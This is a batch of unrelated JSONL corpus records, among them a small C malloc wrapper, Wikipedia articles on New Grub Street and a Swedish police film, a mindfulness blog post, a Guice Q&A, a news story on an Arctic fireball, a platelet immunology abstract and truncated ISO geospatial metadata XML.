{"text": "/*\n * Copyright (c) 2015 Kaprica Security, Inc.\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n *\n */\n#include \"cgc_malloc_private.h\"\n\nvoid *cgc_malloc(cgc_size_t n)\n{\n    return cgc_malloc_alloc(&g_heap, n);\n}\n", "meta": {"pile_set_name": "Github"}}
{"text": "New Grub Street\n\nNew Grub Street is a novel by George Gissing published in 1891, which is set in the literary and journalistic circles of 1880s London. Gissing revised and shortened the novel for a French edition of 1901.\n\nPlot\nThe story deals with the literary world that Gissing himself had experienced. Its title refers to the London street, Grub Street, which in the 18th century became synonymous with hack literature; by Gissing's time, Grub Street itself no longer existed, though hack-writing certainly did. Its two central characters are a sharply contrasted pair of writers: Edwin Reardon, a novelist of some talent but limited commercial prospects, and a shy, cerebral man; and Jasper Milvain, a young journalist, hard-working and capable of generosity, but cynical and only semi-scrupulous about writing and its purpose in the modern (i.e. late Victorian) world.\n\nNew Grub Street opens with Milvain, an \"alarmingly modern young man\" driven by pure financial ambition in navigating his literary career.  He accepts that he will \"always despise the people [he] write[s] for,\" networks within the appropriate social circle to create opportunity, and authors articles for popular periodicals.  Reardon, on the other hand, prefers to write novels of a more literary bent and refuses to pander to contemporary tastes until, as a last-gasp measure against financial ruin, he attempts a popular novel.  At this venture, he is of course too good to succeed, and he's driven to separate from his wife, Amy Reardon, n\u00e9e Yule, who cannot accept her husband's inflexibly high standards\u2014and consequent poverty.\n\nThe Yule family includes Amy's two uncles\u2014John, a wealthy invalid, and Alfred, a species of critic\u2014and Alfred's daughter, and research assistant, Marian.  The friendship that develops between Marian and Milvain's sisters, who move to London following their mother's death, provides opportunity for the former to meet and fall in love with Milvain.  However much Milvain respects Marian's intellectual capabilities and strength of personality, the crucial element (according to him) for marriage is missing:  money.  Marrying a rich woman, after all, is the most convenient way to speed his career.  Indeed, Milvain slights romantic love as a key to marriage:\n\nAs a rule, marriage is the result of a mild preference, encouraged by circumstances, and deliberately heightened into strong sexual feeling.  You, of all men, know well enough that the same kind of feeling could be produced for almost any woman who wasn't repulsive.\n\nEventually, reason enough for an engagement is provided by a legacy of \u00a35,000 left to Marian by John Yule.\n\nLife and death eventually end the possibility of this union.  Milvain's initial career advancement is a position on The Current, a paper edited by Clement Fadge.  Twenty years earlier, Alfred Yule (Marian's father) was slighted by Fadge in a newspaper article, and the resulting acerbic resentment extends even to Milvain.  Alfred refuses to countenance Marian's marriage; but his objection proves to be an obstacle to Milvain only after Yule's eyesight fails and Marian's legacy is reduced to a mere \u00a31,500.  As a result, Marian must work to provide for her parent, and her inheritance is no longer available to Milvain.\n\nBy this time, Milvain already has detected a more desirable target for marriage:  Amy Reardon.  Reardon's poverty and natural disposition toward ill-health culminate in his death following a brief reconciliation with his wife.  She, besides the receipt of \u00a310,000 upon John Yule's death, has the natural beauty and grace to benefit a man in the social events beneficial to his career.  Eventually Amy and Milvain marry; however, as the narrator reveals, this marriage motivated by circumstances is not lacking in more profound areas.  Milvain, it is said, has married the woman he loves, although the narrator never states this as a fact, merely reporting it as something others have said about Milvain. In fact, in a conversation that ends the book, the reader is left to question whether Milvain is in fact haunted by his love for Marian, and his ungentlemanly actions in that regard.\n\nCharacters\nJasper Milvain \u2014 an \"alarmingly modern young man\" who rejects artistic integrity for financial gain and social prominence.  After a broken engagement with Marian Yule, Milvain marries her cousin (and Edwin Reardon's widow), Amy, who received a legacy of \u00a310,000 on her uncle's death.  By the novel's end, Milvain secures an editorship of a periodical \"The Current\" partly due to determination, partly due to largesse made possible by his wife's inheritance.\nEdwin Reardon \u2014 a talented writer of uncommercial novels.  A modicum of early critical praise is disappointed after his marriage to Amy Yule (and fathering of Willie), when Reardon is unable to provide for his family through his chosen profession.  After Reardon fails, he takes refuge in the steady income of a clerkship proffered by a friend.  Reardon is deserted by his wife, who cannot endure poverty and social degradation. They are briefly reconciled when their child becomes ill and dies; but Reardon, whose health has been broken by depression and poor living, is himself seriously ill, and his death soon follows.\nAlfred Yule \u2014 writer.  Yule is a vehement foe of Clement Fadge, the editor who provided Milvain's first break.  His frustrations over meagre financial prospects and a stalled career are repeatedly visited on his wife whose lower-class background and limited education are a continual source of irritation. He dies blind.\nMarian Yule \u2014 cousin of Amy Reardon and daughter of Alfred Yule. A sympathetic portrait of a woman torn between family ties, the possibility of marriage, and the need to earn a living. Loyal to her fiancee Jasper Milvain, she ultimately is forced to acknowledge that he is not prepared to marry her after her financial circumstances have been reduced, and indeed does not even love her. She breaks off the engagement, despite still being in love with him.\nHarold Biffen \u2014 habitually (almost contentedly) down-and-out friend of Reardon.  Biffen scrapes an existence from tutoring. The novel he has worked on for many years is eventually published but attracts little notice. Running out of money, and unwilling to ask his brother for more, he commits suicide.\nDora Milvain \u2014 Jasper Milvain's younger sister, who moves to London following her mother's death.  With Jasper's encouragement, Dora enters onto a career writing for children and encounters early success.  Eventually, she marries Mr. Whelpdale.\nMaud Milvain \u2014 Jasper Milvain's sister, who also moves to London following her mother's death.  Begins writing as well, but is not as ambitious as her sister.  She marries the wealthy Mr. Dolomore.\nMr. Whelpdale \u2014 friend of Milvain and future husband of Dora Milvain.  Whelpdale is a compulsive lover with four broken engagements behind him (in each, the woman's choice).  Having abandoned fiction-writing, Whelpdale concentrates on a business assisting clients in publishing and revising novels.  Eventually, his business finds commercial backing.\n\nPublication history\n1891, UK, Smith, Elder (), hardback (3 volume first edition)\n1904, USA, Brewster (), hardback (1 volume)\n2002, New York, Modern Library (), paperback\n2009, New Grub Street: The 1901 Revised Text, edited by Paul Delany. Victoria: ELS Editions ()\n\nLater references\nThe BBC Radio 4 sitcom Ed Reardon's Week contains characters loosely suggested by the novel.\n\nReferences\n\nSources\n Hansen, Harry (1926). \"Introduction\" to New Grub Street. New York: The Modern Library, pp. v\u2013xii.\n Goldring, Douglas (1920). \"An Outburst on Gissing.\" In: Reputations. London: Chapman & Hall, pp.\u00a0125\u2013132.\n Hicks, Granville (1939). \"The Changing Novel.\" In: Figures in Transition. New York: The Macmillan Company, pp.\u00a0179\u2013203.\n Lang, Andrew (1891). \"Realism in New Grub Street,\" The Author, Vol. II, pp.\u00a043\u201344.\n \n Thomas, J.D. (1953). \"The Public Purposes of George Gissing,\" Nineteenth-Century Fiction, Vol. VIII, No. 2, pp.\u00a0118\u2013123.\n\nExternal links \n\n The World Wide SchoolTM\n Bobby Seal's article on New Grub Street on the London Fictions website\n (plain text and HTML)\n \nNew Grub Street at Internet Archive (scanned books original editions color illustrated)\n\nCategory:1891 British novels\nCategory:Novels by George Gissing\nCategory:Novels set in London\nCategory:Novels about journalists\nCategory:Victorian novels\nCategory:Novels set in the 19th century", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "Cultivating Peace Within\n\nI\u2019m not interested in\nwho suffered the most.\nI\u2019m interested in\npeople getting over it.\n\nOnce when my father was a boy\na stone hit him on the head.\nHair would never grow there.\nOur fingers found the tender spot\nand its riddle: the boy who has fallen\nstands up. A bucket of pears\nin his mother\u2019s doorway welcomes him home.\nThe pears are not crying.\nLater his friend who threw the stone\nsays he was aiming at a bird.\nAnd my father starts growing wings.\n\nEach carries a tender spot:\nSomething our lives forgot to give us.\nA man builds a house and says,\n\u201cI am native now.\u201d\nA woman speaks to a tree in place\nof her son. And olives come.\nA child\u2019s poem says,\n\u201cI don\u2019t like wars,\nthey end up with monuments.\u201d\nHe\u2019s painting a bird with wings\nwide enough to cover two roofs at once.\n\nWhy are we so monumentally slow?\nSoldiers stalk a pharmacy:\nbig guns, little pills.\nIf you tilt your head just slightly\nit\u2019s ridiculous.\n\nThere\u2019s a place in my brain\nwhere hate won\u2019t grow.\nI touch its riddle: wind, and seeds.\nSomething pokes us as we sleep.\n\nStan and I are taking a mindfulness class at St. Mary\u2019s Health and Fitness. We both have meditated for years, but with our current health conditions, it couldn\u2019t hurt to tune up our skills. The first week we had to keep a meditation journal, which for me was a good reminder to do at least a little every day. The second week our assignment was no radio or other music while driving and no television. No television is not too hard for us because we don\u2019t watch much and we DVR shows we do want to watch. We also received colorful Zen dots which are removable round stickers to put all over your house and car and they remind you to take a deep breath whenever you see one. I have one on our Surface keypad,\n\none on my water bottle,\n\none on my Boogie Board,\n\nand I put one Zen dot on my car radio dial.\n\nI have always been a person who notices things, so that didn\u2019t change much driving without radio. But I did pay more attention to my speed. And I was more mindful. We missed the third class, unfortunately, because the Radicava webinar was at the exact same time. The third class was on meditation to handle pain which Stan really needs. There was no class this week and next Wednesday will be the last one. Hopefully Stan can get caught up on the pain lesson.\n\nI have been working on maintaining my inner peace at home despite the loud expressions of frustration and anger that at times spring from the guys I love. I went on strike as Andy\u2019s manager, in that I won\u2019t remind him to get his school work, chores, training, practicing, etc. done. I am done with the conflict: \u201cI know Mom!\u201d spoken quite loudly and then still not getting anything done. At first he begged me to not go on strike. He said, \u201cI like you telling me what to do.\u201d I said, \u201cI am not going to college with you.\u201d Stan has really stepped up his involvement in managing Andy which is awesome.\n\nIt measures breaths per minute and can tell if you are calm, tense, concentrating, active, or sedentary. I set mine to vibrate and notify my phone only when I am tense, because I am usually a calm person. it is interesting to see what causes me to be tense. Spire also has guided breathing meditations including one called clinical strength for pain and that has helped Stan a few times already. It is also water proof so I can use it during water aerobics.\n\nI wake up early in the morning because I love the peaceful time before anyone else is up. My alarm goes off at 4:45 AM and our local public radio station comes on with 15 minutes of classical music which is usually wonderfully calming music to wake up to. At 5 AM NPR news comes on. I like to know what is going on in the world, but I do get more tense when I listen to it. I also get more tense when I look at Facebook, probably more so since he who shall not be named became the head of our country.\n\nI now read an emailed news digest called The Skimm. It\u2019s witty, as well as succinct but detailed if you wish to click links. I find it to be less stress inducing than the news on the radio. It was through The Skimm that I found out about Spire. You can check out The Skimm here: https://www.theskimm.com/?r=b25ee41b I do still read our local newspaper when I have time.\n\nThe news is full of terrorism and war, political strife, senseless killings. These things are not happening more in modern times than they did in history. They have always happened. Terrorism is part of war and wars have been fought throughout history over religious differences, political differences and power struggles. John Lennon said, \u201cImagine all the people living life in peace\u2026imagine all the people sharing all the world\u201d in his famous song Imagine. I will come across as a realist, and even maybe a naysayer because I don\u2019t think this will ever happen. I think our planet will become even more full of war as resources shrink and populations increase.\n\nAs Naomi Shibab Nye said in her poem Jerusalem, \u201cThere\u2019s a place in my brain where hate won\u2019t grow\u201d. It is through mindfulness and meditation that we can get in touch with that peaceful place within ourselves. And it will be more and more important to be able to go to that peaceful place as life\u2019s hardships bombard our local, national, and international newsfeeds, as well as all of our lives.\n\nSearch\n\nSearch for:\n\nText Widget\n\nThis is a text widget, which allows you to add text or HTML to your sidebar. You can use them to display text, links, images, HTML, or a combination of these. Edit them in the Widget section of the Customizer.\n\nFollow this Blog via Email\n\nEnter your email address to follow this blog and receive notifications of new posts by email.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Alsatian Cheese Tart\n\nFrench Chef Michel Bernard Platz, co-owner with Jose Sanabria of Out of Flower cooking school and specialty catering in Dallas, recommends traditional Alsatian fare. In Alsae, the Yuletide dinner starts with an onion and leek tart, followed by a hearty one-dish creation called Baeckaoffa served with walnut bread. For dessert, try an Alsatian Cheese Tart.\n\nADVERTISEMENT\n\nADVERTISEMENT\n\nADVERTISEMENT\n\nABOUT TEXAS HIGHWAYS\n\nPublished monthly by the Texas Department of Transportation, Texas Highways, the official travel magazine of Texas, encourages travel to and within the Lone Star State and tells the Texas story to readers around the world.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nHow to get a list of objects from Guice by their classes?\n\nI defined some \"transformers\" (functions) and need a list of them. Each of them gets created by Guice and I'm using this code to get the list:\npublic class CombinedTransformer extends AbstractTransformer {\n    @Inject CombinedTransformer(\n            FirstTransformer firstTransformer,\n            SecondTransformer secondTransformer,\n            ThirdTransformer thirdTransformer) {\n        transformers = ImmutableList.of(\n                firstTransformer,\n                secondTransformer,\n                thirdTransformer);\n\nMy list is pretty long, so I wonder if there's a simpler way, something like\npublic class CombinedTransformer extends AbstractTransformer {\n    @Inject CombinedTransformer(Injector injector) {\n        transformers = injector.getList(\n            FirstTransformer.class,\n            SecondTransformer.class,\n            ThirdTransformer.class);\n    }\n}\n\nIs there something like this?\n\nA:\n\nYou can use multibindings for this:\nMultibinder<AbstractTransformer> multibinder = Multibinder.newSetBinder(binder(), AbstractTransformer.class);\nmultibinder.addBinding().to(FirstTransformer.class);\nmultibinder.addBinding().to(SecondTransformer.class);\nmultibinder.addBinding().to(ThirdsTransformer.class);\n\nThen you can inject Set<AbstractTransformer>:\n@Inject\nCombinedTransformer(Set<AbstractTransformer> transformers) {\n    // do whatever you want with the set\n}\n\nBut you can't do it without using multibindings directly. If you really need to get a list of objects using statically known list of classes, you can write a wrapper around an injector and use it:\npublic class ListInjectorWrapper {\n    private final Injector injector;\n\n    @Inject\n    ListInjectorWrapper(Injector injector) {\n        this.injector = injector;\n    }\n\n    @SafeVarargs\n    public final <T> List<T> getList(Class<? extends T>... classes) {\n        return Arrays.stream(classes).map(clazz -> injector.getInstance(clazz))\n            .collect(Collectors.toList());\n    }\n}\n\nThen inject it and use it to get your transformers:\n@Inject\nCombinedTransformer(ListInjectorWrapper injectorWrapper) {\n    transformers = injectorWrapper.getList(\n        FirstTransformer.class,\n        SecondTransformer.class,\n        ThirdTransformer.class\n    );\n}\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "### View \u57fa\u7840\n\n- [\u9ad8\u7ea7 UI \u6210\u957f\u4e4b\u8def (\u4e00) View \u7684\u57fa\u7840\u77e5\u8bc6\u4f60\u5fc5\u987b\u77e5\u9053](https://juejin.im/post/5dcff9d3f265da0bd20af0da)\n- [\u6dd8\u5b9d\u5982\u4f55\u505a\u5230\u5c55\u793a\u4ebf\u7ea7\u5546\u54c1\uff08\u5f3a\u6392\u7248\uff0c\u5f3a\u4ea4\u4e92\u5b9e\u73b0\u673a\u5236\uff09](https://github.com/interviewandroid/AndroidInterView/blob/master/android/thread.md)\n- [Android View \u4f53\u7cfb\u7adf\u7136\u8fd8\u80fd\u8fd9\u4e48\u7406\u89e3\uff1f](https://mp.weixin.qq.com/s/ULSW2clH4AjpvlnwD3zgrQ)\n\n\n\n### View \u5de5\u4f5c\u539f\u7406\n\n- [\u9ad8\u7ea7 UI \u6210\u957f\u4e4b\u8def (\u4e09) \u7406\u89e3 View \u5de5\u4f5c\u539f\u7406\u5e76\u5e26\u4f60\u5165\u81ea\u5b9a\u4e49 View \u95e8](https://juejin.im/post/5ddff234518825793218d2e4)\n- [Android *View \u7ed8\u5236* 13 \u95ee 13 \u7b54](http://www.cnblogs.com/punkisnotdead/p/5181821.html)\n- [\u6df1\u5165\u7406\u89e3 Android \u4e4b *View \u7684\u7ed8\u5236*\u6d41\u7a0b](http://www.jianshu.com/p/060b5f68da79)\n- [*View \u7ed8\u5236*\u6d41\u7a0b\u6d45\u6790\uff0c\u6211\u6240\u7406\u89e3\u7684 *View \u7ed8\u5236*\u3002](http://blog.csdn.net/silentweek/article/details/53467002)\n- [View \u7684\u5de5\u4f5c\u539f\u7406\u4e0a View \u7ed8\u5236\u6d41\u7a0b\u68b3\u7406\u53ca Measure \u8fc7\u7a0b\u8be6\u89e3](https://yongyu.itscoder.com/2016/09/11/view_measure/)\n-  [\u5c4f\u5e55\u5237\u65b0\u673a\u5236](https://mp.weixin.qq.com/s/sYz0D7rxCOVzVgTIJImXaQ)\n-  \n\n\n\n#### RecycleView \u539f\u7406\n\n- [RecyclerView \u5237\u65b0\uff0c\u590d\u7528\uff0c\u52a8\u753b](https://github.com/SusionSuc/AdvancedAndroid/blob/master/AndroidFramework\u6e90\u7801\u5206\u6790/recyclerview/README.md)\n\n\n\n", "meta": {"pile_set_name": "Github"}}
{"text": "COPENHAGEN, Denmark -- A blazing fireball lit up the dark skies of Arctic Finland for five seconds, giving off what scientists said was \"the glow of 100 full moons\" and igniting hurried attempts to find the reported meteorite.\n\nFinnish experts were scrambling to calculate its trajectory and find where it landed, according to Tomas Kohout of the University of Helsinki's physics department, who said Thursday night's fireball \"seems to have been one of the brightest ones.\"\n\nIt produced a blast wave that felt like an explosion about 6:40 p.m. and could also be seen in northern Norway and in Russia's Kola peninsula, he told the Associated Press on Saturday.\n\nGet Breaking News Delivered to Your Inbox\n\nFootage captured by Aurora Service Tours showed the bright flash over the night sky.\n\nIt might have weighed about 220 pounds, according to Nikolai Kruglikov of Yekaterinburg's Urals Federal University.\n\n\"We believe it didn't disintegrate but reached a remote corner of Finland,\" Kohout said, adding that any search plans for the meteorite must face the fact that \"right now we don't have much daylight\" -- four hours, to be precise.\n\nThe Norwegian meteorite network said the fireball \"had the glow of 100 full moons\" and likely was going northeast, perhaps \"to the Norwegian peninsula of Varanger,\" north of where the borders of Russia, Finland and Norway meet.\n\nKohout said scientists looked forward to any space debris they can get their hands on.\n\n\"We are happy to recover (it) since this is a unique opportunity to get otherwise inaccessible space material,\" said Kohout. \"This is why it's worth it to search for them.\"\n\nViktor Troshenkov of the Russian Academy of Sciences told the Tass news agency that the fireball could be part of a prolific meteor shower known as the Leonids, which peaks at this time of year. He said he felt Thursday's fireball likely wasn't the sole meteorite but others maybe were not seen due to thick clouds elsewhere.\n\nTroshenkov told Tass that meteor showers can be even stronger. The Leonids reach their maximum once every 33 years -- and the last time that happened was in 1998, he said. Amateur astronomers in the Arctic then saw about 1,000 meteors, 40 meteorites and one fireball in just one night.\n\nIn 2013, a meteorite streaked across the Russian sky and exploded over the Ural Mountains with the power of an atomic bomb, its sonic blasts shattering countless windows and injuring about 1,100 people. Many were cut by flying glass as they flocked to windows, curious about what had produced such a blinding flash of light.\n\nThe 2013 Chelyabinsk meteorite was estimated to be about 10 tons when it entered the Earth's atmosphere at a hypersonic speed of at least 33,000 mph. It shattered into pieces about 18-32 miles above the ground but some meteorite chunks were found in a Russian lake.\n\nA meteoroid is smaller than a kilometer, and often so small that when it enters the Earth's atmosphere it vaporizes and never reaches the ground. A meteor is a flash of light caused by a meteoroid that fails to get through the Earth's atmosphere. If part of it does survive, that's called a meteorite.\n\nAsteroids are generally larger chunks of rock that come from the asteroid belt located between the orbits of Mars and Jupiter.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "[Platelet immunology and the immune response].\nPlatelets exert not only hemostatic activities, but also pro-inflammatory effects. Platelet-linked inflammation seems essentially related to their capacity of secreting cytokines, chemokines and related molecules. This activity is important in terms of concentration of secreted products. This secretory function confers to platelets a regulatory role in immunity. Besides, platelets do exhibit non-self infectious danger detection molecules on their surfaces, belonging in particular to the \"Toll-like receptor family\"; through this property, platelets can bind infectious agents but also deliver differential signals for the secretion of cytokines and chemokines. Platelets, which are non-nucleated cells deprived of nuclear DNA, possess however some cellular machinery which permits intracellular signalling and even the production of RNA transcripts for certain cytokines. Last, platelets express variant surface determinants of hemostatic molecules (referred to as HPA antigens) along with HLA class I variant molecules, the function of which on platelets is still unknown. An intriguing question is to reconcile those diverse properties and to understand whether the pro-inflammatory secretory process can affect the immunogenicity of transfused, allogeneic, platelet components.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "Beck \u2013 \u00d6ga f\u00f6r \u00f6ga\n\nBeck \u2013 \u00d6ga f\u00f6r \u00f6ga (English: Beck \u2013 Eye For An Eye) is a 1998 Swedish police film about Martin Beck, directed by Kjell Sundvall.\n\nCast \n Peter Haber as Martin Beck\n Mikael Persbrandt as Gunvald Larsson\n Stina Rautelin as Lena Klingstr\u00f6m\n Per Morberg as Joakim Wers\u00e9n\n Ingvar Hirdwall as Martin Beck's neighbour\n Rebecka Hemse as Inger (Martin Beck's daughter)\n Fredrik Ultvedt as Jens Loftsg\u00e5rd\n Michael Nyqvist as John Banck\n Anna Ulrica Ericsson as Yvonne J\u00e4der\n Peter H\u00fcttner as Oljelund\n Bo H\u00f6glund as Mats (the waiter)\n Lena T. Hansson as Karin Lofj\u00e4rd\n G\u00f6ran Ragnerstam as Erik Aronsson\n Catarina Cavalli as Karin Lofj\u00e4rd (as young)\n G\u00f6ran Forsmark as Nils Mogren\n\nReferences\n\nExternal links \n\nCategory:1998 television films\nCategory:Films directed by Kjell Sundvall\nCategory:Martin Beck films\nCategory:Swedish films\nCategory:Swedish-language films\nCategory:1990s crime films\nCategory:1990s police procedural films", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<gmd:MD_Metadata xmlns:gco=\"http://www.isotc211.org/2005/gco\" xmlns:gmd=\"http://www.isotc211.org/2005/gmd\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.isotc211.org/2005/gmd http://schemas.opengis.net/iso/19139/20060504/gmd/gmd.xsd\">\n  <gmd:fileIdentifier>\n    <gco:CharacterString>None</gco:CharacterString>\n  </gmd:fileIdentifier>\n  <gmd:language>\n    <gmd:LanguageCode codeList=\"http://www.loc.gov/standards/iso639-2/\" codeListValue=\"eng\">eng\n        </gmd:LanguageCode>\n    <gco:CharacterString>eng</gco:CharacterString>\n  </gmd:language>\n  <gmd:characterSet>\n    <gmd:MD_CharacterSetCode codeList=\"http://www.isotc211.org/2005/resources/Codelist/gmxCodelists.xml#MD_CharacterSetCode\" codeListValue=\"MD_CharacterSetCode_utf8\" codeSpace=\"ISOTC211/19115\">\n            MD_CharacterSetCode_utf8\n        </gmd:MD_CharacterSetCode>\n  </gmd:characterSet>\n  <gmd:hierarchyLevel>\n    <gmd:MD_ScopeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#MD_ScopeCode\" codeListValue=\"dataset\">dataset\n        </gmd:MD_ScopeCode>\n  </gmd:hierarchyLevel>\n  <gmd:contact>\n    <gmd:CI_ResponsibleParty>\n      <gmd:organisationName>\n        <gco:CharacterString/>\n      </gmd:organisationName>\n      <gmd:contactInfo>\n        <gmd:CI_Contact>\n          <gmd:address>\n            <gmd:CI_Address>\n              <gmd:electronicMailAddress>\n                <gco:CharacterString/>\n              </gmd:electronicMailAddress>\n            </gmd:CI_Address>\n          </gmd:address>\n        </gmd:CI_Contact>\n      </gmd:contactInfo>\n      <gmd:role>\n        <gmd:CI_RoleCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_RoleCode\" codeListValue=\"pointOfContact\">pointOfContact\n                </gmd:CI_RoleCode>\n      </gmd:role>\n    </gmd:CI_ResponsibleParty>\n  </gmd:contact>\n  <gmd:dateStamp>\n    <gco:Date/>\n  </gmd:dateStamp>\n  <gmd:metadataStandardName>\n    <gco:CharacterString>ISO19115</gco:CharacterString>\n  </gmd:metadataStandardName>\n  <gmd:metadataStandardVersion>\n    <gco:CharacterString>2003/Cor.1:2006</gco:CharacterString>\n  </gmd:metadataStandardVersion>\n  <gmd:identificationInfo>\n    <gmd:MD_DataIdentification>\n      <gmd:abstract>\n        <gco:CharacterString/>\n      </gmd:abstract>\n      <gmd:citation>\n        <gmd:CI_Citation>\n          <gmd:title>\n            <gco:CharacterString>buildings_osm_4326</gco:CharacterString>\n          </gmd:title>\n          <gmd:date>\n            <gmd:CI_Date>\n              <gmd:date>\n                <gco:Date/>\n              </gmd:date>\n              <gmd:dateType>\n                <gmd:CI_DateTypeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_DateTypeCode\" codeListValue=\"publication\">publication\n                                </gmd:CI_DateTypeCode>\n              </gmd:dateType>\n            </gmd:CI_Date>\n          </gmd:date>\n          <gmd:date>\n            <gmd:CI_Date>\n              <gmd:date>\n                <gco:Date/>\n              </gmd:date>\n              <gmd:dateType>\n                <gmd:CI_DateTypeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_DateTypeCode\" codeListValue=\"revision\">revision\n                                </gmd:CI_DateTypeCode>\n              </gmd:dateType>\n            </gmd:CI_Date>\n          </gmd:date>\n          <gmd:date>\n            <gmd:CI_Date>\n              <gmd:date>\n                <gco:Date/>\n              </gmd:date>\n              <gmd:dateType>\n                <gmd:CI_DateTypeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_DateTypeCode\" codeListValue=\"creation\">creation\n                                </gmd:CI_DateTypeCode>\n              </gmd:dateType>\n            </gmd:CI_Date>\n          </gmd:date>\n          <gmd:identifier>\n            <gmd:RS_Identifier>\n              <gmd:code>\n                <gco:CharacterString>None</gco:CharacterString>\n              </gmd:code>\n            </gmd:RS_Identifier>\n          </gmd:identifier>\n        </gmd:CI_Citation>\n      </gmd:citation>\n      <gmd:pointOfContact>\n        <gmd:CI_ResponsibleParty>\n          <gmd:organisationName>\n            <gco:CharacterString/>\n          </gmd:organisationName>\n          <gmd:contactInfo>\n            <gmd:CI_Contact>\n              <gmd:address>\n                <gmd:CI_Address>\n                  <gmd:electronicMailAddress>\n                    <gco:CharacterString/>\n                  </gmd:electronicMailAddress>\n                </gmd:CI_Address>\n              </gmd:address>\n            </gmd:CI_Contact>\n          </gmd:contactInfo>\n        </gmd:CI_ResponsibleParty>\n      </gmd:pointOfContact>\n      <gmd:descriptiveKeywords>\n        <gmd:MD_Keywords>\n          <gmd:keyword>\n            <gco:CharacterString>Human health and safety\n                        </gco:CharacterString>\n          </gmd:keyword>\n          <gmd:thesaurusName>\n            <gmd:CI_Citation>\n              <gmd:title>\n                <gco:CharacterString>GEMET - INSPIRE themes,\n                                    version 1.0\n                                </gco:CharacterString>\n              </gmd:title>\n              <gmd:date>\n                <gmd:CI_Date>\n                  <gmd:date>\n                    <gco:Date>2008-06-01</gco:Date>\n                  </gmd:date>\n                  <gmd:dateType>\n                    <gmd:CI_DateTypeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_DateTypeCode\" codeListValue=\"publication\">\n                                            publication\n                                        </gmd:CI_DateTypeCode>\n                  </gmd:dateType>\n                </gmd:CI_Date>\n              </gmd:date>\n            </gmd:CI_Citation>\n          </gmd:thesaurusName>\n        </gmd:MD_Keywords>\n      </gmd:descriptiveKeywords>\n      <gmd:resourceConstraints>\n        <gmd:MD_Constraints>\n          <gmd:useLimitation>\n            <gco:CharacterString/>\n          </gmd:useLimitation>\n        </gmd:MD_Constraints>\n      </gmd:resourceConstraints>\n      <gmd:language>\n        <gmd:LanguageCode codeList=\"http://www.loc.gov/standards/iso639-2/\" codeListValue=\"eng\">eng\n                </gmd:LanguageCode>\n      </gmd:language>\n      <gmd:topicCategory>\n        <gmd:MD_TopicCategoryCode>geoscientificInformation\n                </gmd:MD_TopicCategoryCode>\n      </gmd:topicCategory>\n      <gmd:extent>\n        <gmd:EX_Extent>\n                </gmd:EX_Extent>\n      </gmd:extent>\n      <gmd:supplementalInformation>\n        <inasafe>\n          <source>\n            <gco:CharacterString/>\n          </source>\n          <scale>\n            <gco:CharacterString/>\n          </scale>\n          <layer_mode>\n            <gco:CharacterString>classified</gco:CharacterString>\n          </layer_mode>\n          <exposure_unit>\n            <gco:CharacterString/>\n          </exposure_unit>\n          <multipart_polygon>\n            <gco:Boolean/>\n          </multipart_polygon>\n          <datatype>\n            <gco:CharacterString/>\n          </datatype>\n          <keyword_version>\n            <gco:CharacterString>3.5</gco:CharacterString>\n          </keyword_version>\n          <report>\n            <gco:CharacterString/>\n          </report>\n          <layer_geometry>\n            <gco:CharacterString>polygon</gco:CharacterString>\n          </layer_geometry>\n          <layer_purpose>\n            <gco:CharacterString>exposure</gco:CharacterString>\n          </layer_purpose>\n          <structure_class_field>\n            <gco:CharacterString>FLOODED</gco:CharacterString>\n          </structure_class_field>\n          <road_class_field>\n            <gco:CharacterString/>\n          </road_class_field>\n          <exposure>\n            <gco:CharacterString>structure</gco:CharacterString>\n          </exposure>\n        </inasafe>\n      </gmd:supplementalInformation>\n    </gmd:MD_DataIdentification>\n  </gmd:identificationInfo>\n  <gmd:distributionInfo>\n    <gmd:MD_Distribution>\n      <gmd:distributionFormat>\n        <gmd:MD_Format>\n          <gmd:name>\n            <gco:CharacterString>unknown</gco:CharacterString>\n          </gmd:name>\n          <gmd:version>\n            <gco:CharacterString>unknown</gco:CharacterString>\n          </gmd:version>\n        </gmd:MD_Format>\n      </gmd:distributionFormat>\n      <gmd:transferOptions>\n        <gmd:MD_DigitalTransferOptions>\n          <gmd:onLine>\n            <gmd:CI_OnlineResource>\n              <gmd:linkage>\n                <gmd:URL/>\n              </gmd:linkage>\n            </gmd:CI_OnlineResource>\n          </gmd:onLine>\n        